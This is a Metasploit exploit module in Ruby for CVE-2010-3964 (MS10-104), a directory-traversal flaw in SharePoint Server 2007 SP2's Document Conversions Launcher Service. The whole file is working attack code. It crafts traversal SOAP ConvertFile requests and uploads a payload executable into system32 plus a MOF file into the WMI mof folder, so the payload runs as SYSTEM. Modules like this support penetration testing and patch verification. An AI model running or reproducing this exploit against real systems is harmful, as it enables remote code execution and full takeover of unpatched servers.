##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec

  def initialize
    super(
      'Name'        => 'Microsoft Office SharePoint Server 2007 Remote Code Execution',
      'Description'    => %q{
          This module exploits a vulnerability found in SharePoint Server 2007 SP2. The
        software contains a directory traversal, that allows a remote attacker to write
        arbitrary files to the filesystem, sending a specially crafted SOAP ConvertFile
        request to the Office Document Conversions Launcher Service, which results in code
        execution under the context of 'SYSTEM'.

        The module uses uses the Windows Management Instrumentation service to execute an
        arbitrary payload on vulnerable installations of SharePoint on Windows 2003 Servers.
        It has been successfully tested on Office SharePoint Server 2007 SP2 over Windows
        2003 SP2.
      },
      'Author'      => [
        'Oleksandr Mirosh', # Vulnerability Discovery and PoC
        'James Burton', # Vulnerability analysis published at "Entomology: A Case Study of Rare and Interesting Bugs"
        'juan' # Metasploit module
      ],
      'Platform'    => 'win',
      'References'  =>
        [
          [ 'CVE', '2010-3964' ],
          [ 'OSVDB', '69817' ],
          [ 'BID', '45264' ],
          [ 'MSB', 'MS10-104' ],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-287/' ]
        ],
      'Targets'     =>
        [
          [ 'Microsoft Office SharePoint Server 2007 SP2 / Microsoft Windows Server 2003 SP2', { } ],
        ],
      'DefaultTarget'  => 0,
      'Privileged'     => true,
      'DisclosureDate' => 'Dec 14 2010'
    )

    register_options(
      [
        Opt::RPORT(8082),
        OptInt.new('DEPTH', [true, "Levels to reach base directory",7])
      ], self.class)
  end

  # Msf::Exploit::Remote::HttpClient is avoided because send_request_cgi doesn't get
  # the response maybe due to the 100 (Continue) status response even when the Expect
  # header isn't included in the request.
  def upload_file(file_name, contents)

    traversal = "..\\" * datastore['DEPTH']

    soap_convert_file = "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
    soap_convert_file << "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" "
    soap_convert_file << "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" "
    soap_convert_file << "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" "
    soap_convert_file << "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\" "
    soap_convert_file << "SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">" << "\x0d\x0a"
    soap_convert_file << "<SOAP-ENV:Body>" << "\x0d\x0a"
    soap_convert_file << "<i2:ConvertFile id=\"ref-1\" "
    soap_convert_file << "xmlns:i2=\"http://schemas.microsoft.com/clr/nsassem/Microsoft.HtmlTrans.IDocumentConversionsLauncher/Microsoft.HtmlTrans.Interface\">" << "\x0d\x0a"
    soap_convert_file << "<launcherUri id=\"ref-3\">http://#{rhost}:8082/HtmlTrLauncher</launcherUri>" << "\x0d\x0a"
    soap_convert_file << "<appExe id=\"ref-4\"></appExe>" << "\x0d\x0a"
    soap_convert_file << "<convertFrom id=\"ref-5\">#{traversal}#{file_name}</convertFrom>" << "\x0d\x0a"
    soap_convert_file << "<convertTo id=\"ref-6\">html</convertTo>" << "\x0d\x0a"
    soap_convert_file << "<fileBits href=\"#ref-7\"/>" << "\x0d\x0a"
    soap_convert_file << "<taskName id=\"ref-8\">brochure_to_html</taskName>" << "\x0d\x0a"
    soap_convert_file << "<configInfo id=\"ref-9\"></configInfo>" << "\x0d\x0a"
    soap_convert_file << "<timeout>20</timeout>" << "\x0d\x0a"
    soap_convert_file << "<fReturnFileBits>true</fReturnFileBits>" << "\x0d\x0a"
    soap_convert_file << "</i2:ConvertFile>" << "\x0d\x0a"
    soap_convert_file << "<SOAP-ENC:Array id=\"ref-7\" xsi:type=\"SOAP-ENC:base64\">#{Rex::Text.encode_base64(contents)}</SOAP-ENC:Array>" << "\x0d\x0a"
    soap_convert_file << "</SOAP-ENV:Body>" << "\x0d\x0a"
    soap_convert_file << "</SOAP-ENV:Envelope>" << "\x0d\x0a"

    http_request = "POST /HtmlTrLauncher HTTP/1.1" << "\x0d\x0a"
    http_request << "User-Agent: Mozilla/4.0+(compatible; MSIE 6.0; Windows 5.2.3790.131072; MS .NET Remoting; MS .NET CLR 2.0.50727.42 )" << "\x0d\x0a"
    http_request << "Content-Type: text/xml; charset=\"utf-8\"" << "\x0d\x0a"
    http_request << "SOAPAction: \"http://schemas.microsoft.com/clr/nsassem/Microsoft.HtmlTrans.IDocumentConversionsLauncher/Microsoft.HtmlTrans.Interface#ConvertFile\"" << "\x0d\x0a"
    http_request << "Host: #{rhost}:#{rport}" << "\x0d\x0a"
    http_request << "Content-Length: #{soap_convert_file.length}" << "\x0d\x0a"
    http_request << "Connection: Keep-Alive" << "\x0d\x0a\x0d\x0a"

    connect
    sock.put(http_request << soap_convert_file)
    data = ""
    read_data = sock.get_once(-1, 1)
    while not read_data.nil?
      data << read_data
      read_data = sock.get_once(-1, 1)
    end
    disconnect
    return data
  end

  # The check tries to create a test file in the root
  def check

    peer = "#{rhost}:#{rport}"
    filename = rand_text_alpha(rand(10)+5) + '.txt'
    contents = rand_text_alpha(rand(10)+5)

    print_status("#{peer} - Sending HTTP ConvertFile Request to upload the test file #{filename}")
    res = upload_file(filename, contents)

    if res and res =~ /200 OK/ and res =~ /ConvertFileResponse/ and res =~ /<m_ce>CE_OTHER<\/m_ce>/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit

    peer = "#{rhost}:#{rport}"

    # Setup the necessary files to do the wbemexec trick
    exe_name = rand_text_alpha(rand(10)+5) + '.exe'
    exe      = generate_payload_exe
    mof_name = rand_text_alpha(rand(10)+5) + '.mof'
    mof      = generate_mof(mof_name, exe_name)

    print_status("#{peer} - Sending HTTP ConvertFile Request to upload the exe payload #{exe_name}")
    res = upload_file("WINDOWS\\system32\\#{exe_name}", exe)
    if res and res =~ /200 OK/ and res =~ /ConvertFileResponse/ and res =~ /<m_ce>CE_OTHER<\/m_ce>/
      print_good("#{peer} - #{exe_name} uploaded successfully")
    else
      print_error("#{peer} - Failed to upload #{exe_name}")
      return
    end

    print_status("#{peer} - Sending HTTP ConvertFile Request to upload the mof file #{mof_name}")
    res = upload_file("WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
    if res and res =~ /200 OK/ and res =~ /ConvertFileResponse/ and res =~ /<m_ce>CE_OTHER<\/m_ce>/
      print_good("#{peer} - #{mof_name} uploaded successfully")
    else
      print_error("#{peer} - Failed to upload #{mof_name}")
      return
    end

  end

end
